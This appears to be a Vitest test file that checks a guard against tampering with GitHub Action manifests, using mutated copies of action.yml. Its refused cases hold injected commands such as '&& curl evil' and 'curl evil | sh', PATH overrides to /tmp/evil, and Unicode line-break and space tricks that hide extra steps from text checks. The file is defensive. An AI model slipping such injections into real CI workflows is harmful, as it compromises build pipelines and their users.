import { readFileSync } from 'node:fs';
import { fileURLToPath, pathToFileURL } from 'node:url';

import { beforeAll, describe, expect, it } from 'vitest';

// Every case below was found by a review of #687 or #689 to pass an earlier version of the
// manifest checks, or is a legitimate edit those checks must keep accepting. The guard runs in
// memory here; scripts/validate-distribution-metadata.mjs runs the same function on the committed
// manifests. Characters that YAML reads differently from a text check are built with
// String.fromCodePoint so that no invisible character sits in this file.

type Form = 'root' | 'nested';

interface Guard {
  checkActionManifest(manifestName: string, manifest: string, form: Form): void;
  computeInputsOutputsSha256(manifestName: string, manifest: string): string;
  readonly ACTION_INPUTS_OUTPUTS_SHA256: Readonly<Record<Form, string>>;
}

const GUARD_URL = pathToFileURL(fileURLToPath(new URL('../../scripts/action-manifest-guard.mjs', import.meta.url))).href;

const MANIFESTS: ReadonlyArray<readonly [Form, string, string]> = [
  ['root', 'action.yml', readFileSync(fileURLToPath(new URL('../../action.yml', import.meta.url)), 'utf8')],
  ['nested', 'action/action.yml', readFileSync(fileURLToPath(new URL('../../action/action.yml', import.meta.url)), 'utf8')],
];

const CR = String.fromCodePoint(0x0d);
const NEL = String.fromCodePoint(0x85);
const LS = String.fromCodePoint(0x2028);
const PS = String.fromCodePoint(0x2029);
const NBSP = String.fromCodePoint(0xa0);
const EM_SPACE = String.fromCodePoint(0x2003);
const IDEOGRAPHIC_SPACE = String.fromCodePoint(0x3000);
const OGHAM_SPACE = String.fromCodePoint(0x1680);
const NARROW_NBSP = String.fromCodePoint(0x202f);
const BOM = String.fromCodePoint(0xfeff);

// Replaces the first match of `from`, at or after `after` when given. Throws when nothing matches,
// so a case whose anchor drifted fails instead of passing an unmutated manifest.
function swap(text: string, from: string | RegExp, to: string, after?: string): string {
  const offset = after === undefined ? 0 : text.indexOf(after);
  if (offset < 0) throw new Error(`anchor not found: ${after}`);
  const head = text.slice(0, offset);
  const tail = text.slice(offset);
  const index = typeof from === 'string' ? tail.indexOf(from) : tail.search(from);
  if (index < 0) throw new Error(`mutation anchor not found: ${String(from)}`);
  const matched = typeof from === 'string' ? from : (tail.match(from)?.[0] ?? '');
  return head + tail.slice(0, index) + to + tail.slice(index + matched.length);
}

const INSTALL = '    - name: Install dependencies\n';
const BUILD = '    - name: Build the Cejel CLI\n';
const RUNNER_STEP = '    - name: Run Cejel';
const RUNNER_LINE = /      run: node "\$GITHUB_ACTION_PATH\/[^"\n]+"/;
const CEJEL_DIR_LINE = /        cejel_dir=[^\n]+/;
const SELF_CHECK =
  '        ran="pnpm@$("$pnpm" --version)"\n' +
  '        if [ "$ran" != "$CEJEL_PNPM" ]; then\n' +
  '          echo "::error::expected $CEJEL_PNPM from this action\'s package.json, installed $ran"\n' +
  '          exit 1\n' +
  '        fi\n';
const NPM_INSTALL =
  'npm install --prefix "$work" --no-save --no-package-lock --ignore-scripts --no-audit --no-fund "$CEJEL_PNPM"';
const INSTALL_ENV = '      env:\n        CEJEL_PNPM: ${{ steps.cejel-pnpm.outputs.spec }}\n';
const RUNNER_ENV = '        WITAN_REPO_PATH: ${{ inputs.repo-path }}\n';
const ADDED_STEP = '    - name: Extra\n      shell: bash\n      run: pnpm install\n\n';
const RUBRIC_DEFAULT =
  "fetch-depth: 0. v27 reads the commit history, so a shallow clone gets no full v27 result.\n    required: false\n    default: ''\n";
const DESCRIPTION_START = /^description: (?:'|>-\n  )/m;
const PROSPECTIVE = 'witan-rubric-v27-prospective-2026-10-19';

type Mutation = (text: string) => string;

const REFUSED: ReadonlyArray<readonly [string, Mutation]> = [
  // The first review of #687: one step's isolation removed, or an extra step.
  ['cejel_dir set to the caller workspace in install only', (t) => swap(t, CEJEL_DIR_LINE, '        cejel_dir="$GITHUB_WORKSPACE"', INSTALL)],
  ['cd "$work" removed from build', (t) => swap(t, '        cd "$work"\n', '', BUILD)],
  ['version self-check removed from build', (t) => swap(t, SELF_CHECK, '', BUILD)],
  ['set -euo pipefail removed from install', (t) => swap(t, '        set -euo pipefail\n', '', INSTALL)],
  ['empty package.json write removed from install', (t) => swap(t, "        printf '{}\\n' > package.json\n", '', INSTALL)],
  ['bare pnpm from PATH in build', (t) => swap(t, '"$pnpm" --dir "$cejel_dir" run build', 'pnpm --dir "$cejel_dir" run build')],
  [
    'fail-open cd "$(mktemp …)"',
    (t) =>
      swap(
        t,
        '        work="$(mktemp -d "$RUNNER_TEMP/cejel-pnpm.XXXXXX")"\n        cd "$work"\n',
        '        cd "$(mktemp -d "$RUNNER_TEMP/cejel-pnpm.XXXXXX")"\n        work="$PWD"\n',
        INSTALL,
      ),
  ],
  ['an added named run: pnpm install step', (t) => swap(t, BUILD, ADDED_STEP + BUILD)],
  ['an added unnamed - run: pnpm -v step', (t) => swap(t, BUILD, '    - run: pnpm -v\n      shell: bash\n\n' + BUILD)],
  ['an extra command on the runner line', (t) => t.replace(RUNNER_LINE, (m) => `${m} && curl evil`)],
  ['package-manager-cache: false removed', (t) => swap(t, '        package-manager-cache: false\n', '')],
  ['the version regex loosened', (t) => swap(t, String.raw`(pnpm@\d+\.\d+\.\d+)`, String.raw`(pnpm@\S+)`)],
  ['a GITHUB_PATH write', (t) => swap(t, '        cd "$work"\n', '        cd "$work"\n        echo "$work" >> "$GITHUB_PATH"\n', INSTALL)],
  ['a re-added pnpm/action-setup step', (t) => swap(t, INSTALL, '    - uses: pnpm/action-setup@a7487c7e89a18df4991f7f222e4898a00d66ddda\n\n' + INSTALL)],
  // dcb7a63fc: the npm install --prefix design.
  ['--prefix removed', (t) => swap(t, NPM_INSTALL, NPM_INSTALL.replace(' --prefix "$work"', ''), INSTALL)],
  ['--ignore-scripts removed', (t) => swap(t, NPM_INSTALL, NPM_INSTALL.replace(' --ignore-scripts', ''), INSTALL)],
  ['a return to npm exec', (t) => swap(t, '"$pnpm" --dir "$cejel_dir" install', 'npm exec --yes -- "$CEJEL_PNPM" --dir "$cejel_dir" install')],
  ['a flow-style step', (t) => swap(t, BUILD, '    - { name: Extra, shell: bash, run: pnpm install }\n\n' + BUILD)],
  ['an if:-first uses: step', (t) => swap(t, BUILD, "    - if: always()\n      uses: actions/cache@0400d5f644dc74513175e3cd8d07132dd4860809\n      with:\n        path: x\n        key: x\n\n" + BUILD)],
  ['an env:-first run step', (t) => swap(t, BUILD, '    - env:\n        X: y\n      shell: bash\n      run: pnpm install\n\n' + BUILD)],
  ['a literal CEJEL_PNPM', (t) => swap(t, '        CEJEL_PNPM: ${{ steps.cejel-pnpm.outputs.spec }}', '        CEJEL_PNPM: pnpm@9.0.0', INSTALL)],
  ['CEJEL_PNPM fed from a new input', (t) => swap(swap(t, '        CEJEL_PNPM: ${{ steps.cejel-pnpm.outputs.spec }}', '        CEJEL_PNPM: ${{ inputs.pnpm }}', INSTALL), 'outputs:\n', "  pnpm:\n    description: 'pnpm'\n    default: 'pnpm@9.0.0'\noutputs:\n")],
  ['step env: setting PATH', (t) => swap(t, INSTALL_ENV, INSTALL_ENV + '        PATH: /tmp/evil:/usr/bin\n', INSTALL)],
  ['step env: setting NPM_CONFIG_REGISTRY', (t) => swap(t, INSTALL_ENV, INSTALL_ENV + '        NPM_CONFIG_REGISTRY: https://registry.example\n', INSTALL)],
  ['step env: setting RUNNER_TEMP', (t) => swap(t, INSTALL_ENV, INSTALL_ENV + '        RUNNER_TEMP: .\n', INSTALL)],
  ['working-directory on install', (t) => swap(t, '      shell: bash\n', '      shell: bash\n      working-directory: ${{ github.workspace }}\n', INSTALL)],
  ['continue-on-error on install', (t) => swap(t, '      shell: bash\n', '      shell: bash\n      continue-on-error: true\n', INSTALL)],
  ['shell: sh on install', (t) => swap(t, '      shell: bash\n', '      shell: sh\n', INSTALL)],
  ['setup-node cache: pnpm', (t) => swap(t, '        package-manager-cache: false\n', '        package-manager-cache: false\n        cache: pnpm\n')],
  ['package-manager-cache left only in a comment', (t) => swap(t, '        package-manager-cache: false\n', '        # package-manager-cache: false\n')],
  ['setup-node node-version-file', (t) => swap(t, "        node-version: '22'\n", '        node-version-file: .nvmrc\n')],
  ['setup-node floating @v6', (t) => swap(t, /actions\/setup-node@[0-9a-f]{40} # v6/, 'actions/setup-node@v6')],
  ['a top-level key after runs:', (t) => `${t.replace(/\n+$/, '')}\nx-extra: 1\n`],
  // 3e8b9d436: a lone CR, NEL, LS or PS is a line break to YamlDotNet 5.3.0 but not to /\r?\n/.
  ...([
    ['CR', CR],
    ['NEL', NEL],
    ['LS', LS],
    ['PS', PS],
  ] as const).flatMap(([label, br]) => [
    [`a step hidden after a ${label} in a comment`, (t: string) => swap(t, BUILD, `    # note${br}    - name: Extra${br}      shell: bash${br}      run: pnpm install\n${BUILD}`)] as const,
    [`a script line hidden after a ${label}`, (t: string) => swap(t, '        cd "$work"\n', `        cd "$work" # note${br}        echo x >> "$GITHUB_OUTPUT"\n`, INSTALL)] as const,
    [`a step env PATH hidden after a ${label}`, (t: string) => swap(t, INSTALL_ENV, `${INSTALL_ENV.trimEnd()} # note${br}        PATH: /tmp/evil\n`, INSTALL)] as const,
    [`an if: false hidden after a ${label}`, (t: string) => swap(t, '      shell: bash\n', `      shell: bash # note${br}      if: false\n`, INSTALL)] as const,
  ]),
  ['a second YAML document', (t) => `${t.replace(/\n+$/, '')}\n---\nruns:\n  using: node20\n  main: x.js\n`],
  ['a document start marker at the top', (t) => `---\n${t}`],
  ['a duplicate quoted "runs": before the real one', (t) => swap(t, 'inputs:\n', '"runs":\n  using: node20\n  main: x.js\ninputs:\n')],
  ['a BOM', (t) => BOM + t],
  // b2ca8e3ea: lines that look like comments to a text check but are script or scalar to YAML.
  ['a # line breaking out of the node -e quote', (t) => swap(t, '          process.stdout.write(match[1]);\n', "          process.stdout.write(match[1]);\n#' ; echo x >> \"$GITHUB_OUTPUT\" ; : '\n")],
  ['a # line plus a GITHUB_PATH write in install', (t) => swap(t, '        cd "$work"\n', '        cd "$work"\n        # keep\n        echo "$work" >> "$GITHUB_PATH"\n', INSTALL)],
  ['a plain comment line inside a script', (t) => swap(t, '        cd "$work"\n', '        cd "$work"\n        # a comment\n', INSTALL)],
  ...([
    ['U+00A0', NBSP],
    ['U+3000', IDEOGRAPHIC_SPACE],
    ['U+1680', OGHAM_SPACE],
  ] as const).map(
    ([label, space]) =>
      [`a ${label}-led # line in the install script`, (t: string) => swap(t, '        cd "$work"\n', `        cd "$work"\n${space}# curl evil | sh\n`, INSTALL)] as const,
  ),
  ['an NBSP continuation under the runner line', (t) => t.replace(RUNNER_LINE, (m) => `${m}\n${NBSP}      && curl evil`)],
  ['an EM SPACE continuation under the runner line', (t) => t.replace(RUNNER_LINE, (m) => `${m}\n${EM_SPACE}      && curl evil`)],
  ['a U+202F continuation inside env:', (t) => swap(t, RUNNER_ENV, `${RUNNER_ENV}${NARROW_NBSP}PATH: /tmp/evil\n`, RUNNER_STEP)],
  ['a column-0 comment inside runs:', (t) => swap(t, INSTALL, `# note\n${INSTALL}`)],
  ['a comment after runs:', (t) => `${t.replace(/\n+$/, '')}\n# trailing note\n`],
  ['U+00A0 in the description', (t) => t.replace(DESCRIPTION_START, (m) => `${m}${NBSP}`)],
  // #689: inputs: and outputs: sit outside runs: and were pinned only in part, or not at all.
  ['out-dir default changed to .', (t) => swap(t, "    default: '.cejel'\n", "    default: '.'\n")],
  ['repo-path default changed to /', (t) => swap(t, "    required: false\n    default: ''\n", "    required: false\n    default: '/'\n", '  repo-path:\n')],
  ['min-score default set', (t) => swap(t, "    default: ''\n", "    default: '4'\n", '  min-score:\n')],
  ['rubric-pin default set to a prospective rubric', (t) => swap(t, "    default: ''\n", `    default: '${PROSPECTIVE}'\n`, '  rubric-pin:\n')],
  ['a new input', (t) => swap(t, 'outputs:\n', "  extra:\n    description: 'x'\n    required: false\n    default: ''\noutputs:\n")],
  ['an input marked required', (t) => swap(t, '    required: false\n', '    required: true\n', '  out-dir:\n')],
  ['an output value set to the token', (t) => swap(t, '${{ steps.witan-run.outputs.score }}', '${{ github.token }}')],
  ['an output removed', (t) => swap(t, /  limitations:\n[^\n]+\n[^\n]+\n/, '')],
  ['an output description changed', (t) => swap(t, 'Overall Cejel trust score', 'Overall trust score')],
  ['a comment inside inputs:', (t) => swap(t, '  repo-path:\n', '  # the repository\n  repo-path:\n')],
  ['a second inputs: key above the real one', (t) => swap(t, 'inputs:\n', "inputs:\n  extra:\n    default: 'x'\ninputs:\n")],
  ['a quoted duplicate "inputs": above the real one', (t) => swap(t, 'inputs:\n', "\"inputs\":\n  repo-path:\n    default: '/'\ninputs:\n")],
  ['a quoted duplicate "outputs": above inputs:', (t) => swap(t, 'inputs:\n', "\"outputs\":\n  score:\n    value: x\ninputs:\n")],
  ['inputs: written with a trailing comment', (t) => swap(t, 'inputs:\n', 'inputs: # pinned\n')],
  [
    'the rubric-pin decoy in a block scalar above inputs:, real default changed',
    (t) =>
      swap(
        swap(t, 'inputs:\n', `x-decoy: |\n  ${RUBRIC_DEFAULT.replace(/\n/g, '\n  ')}\ninputs:\n`),
        "    default: ''\n",
        `    default: '${PROSPECTIVE}'\n`,
        '  rubric-pin:\n',
      ),
  ],
  [
    'the rubric-pin decoy in a quoted description after the real default',
    (t) =>
      swap(
        t,
        /  rubric-pin:\n(?:    [^\n]*\n|      [^\n]*\n)+/,
        `  rubric-pin:\n    required: false\n    default: '${PROSPECTIVE}'\n    description: "Explicit opt-in only.\n      ${RUBRIC_DEFAULT.replace(/\n/g, '\n      ')}"\n`,
      ),
  ],
];

const ACCEPTED: ReadonlyArray<readonly [string, Mutation]> = [
  ['the committed manifest', (t) => t],
  ['an edited description', (t) => t.replace(DESCRIPTION_START, (m) => `${m}Edited. `)],
  ['a comment line added above inputs:', (t) => swap(t, 'inputs:\n', '# One more note.\ninputs:\n')],
  ['a branding colour change', (t) => swap(t, "  color: 'green'\n", "  color: 'blue'\n")],
  ['CRLF line endings', (t) => t.replace(/\n/g, '\r\n')],
  ['extra trailing newlines', (t) => `${t}\n\n`],
  // Free text above inputs: cannot change the pinned region; the decoy alone is harmless.
  ['the rubric-pin text in a block scalar above inputs:', (t) => swap(t, 'inputs:\n', `x-decoy: |\n  ${RUBRIC_DEFAULT.replace(/\n/g, '\n  ')}\ninputs:\n`)],
];

describe('action-manifest-guard', () => {
  let guard: Guard;
  beforeAll(async () => {
    guard = (await import(GUARD_URL)) as Guard;
  });

  for (const [form, name, manifest] of MANIFESTS) {
    describe(`${name} (${form})`, () => {
      for (const [label, mutate] of ACCEPTED) {
        it(`accepts ${label}`, () => {
          const mutated = mutate(manifest);
          if (label !== 'the committed manifest') expect(mutated).not.toBe(manifest);
          expect(() => guard.checkActionManifest(name, mutated, form)).not.toThrow();
        });
      }

      for (const [label, mutate] of REFUSED) {
        it(`refuses ${label}`, () => {
          const mutated = mutate(manifest);
          expect(mutated).not.toBe(manifest);
          expect(() => guard.checkActionManifest(name, mutated, form)).toThrow();
        });
      }

      it('refuses the other form', () => {
        const other: Form = form === 'root' ? 'nested' : 'root';
        expect(() => guard.checkActionManifest(name, manifest, other)).toThrow(/runs: section differs/);
      });

      it('names the actual hash when the inputs:/outputs: pin does not match', () => {
        const mutated = swap(manifest, "    default: '.cejel'\n", "    default: '.'\n");
        const actual = guard.computeInputsOutputsSha256(name, mutated);
        expect(actual).not.toBe(guard.ACTION_INPUTS_OUTPUTS_SHA256[form]);
        expect(() => guard.checkActionManifest(name, mutated, form)).toThrow(actual);
      });
    });
  }
});
